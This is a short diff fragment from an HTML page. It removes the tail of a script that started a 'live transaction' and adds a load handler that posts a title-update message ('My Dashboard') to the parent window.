-                initiateLiveTransaction(runtimeSessionData);
-            });
-        }
-    </script>
+window.addEventListener("load", () => {
+    window.parent.postMessage({ type: "UPDATE_TITLE", title: "My Dashboard" }, "*");
+});
+</script>
 </body>
 </html>
